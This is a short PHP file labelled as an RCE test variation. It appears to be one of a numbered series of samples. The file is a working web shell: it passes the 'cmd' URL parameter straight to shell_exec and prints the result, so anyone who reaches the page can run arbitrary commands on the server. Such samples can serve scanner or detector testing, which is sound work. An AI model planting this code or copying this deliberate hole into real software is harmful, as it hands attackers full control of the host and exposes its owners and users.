<?php
// RCE test variation #502
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>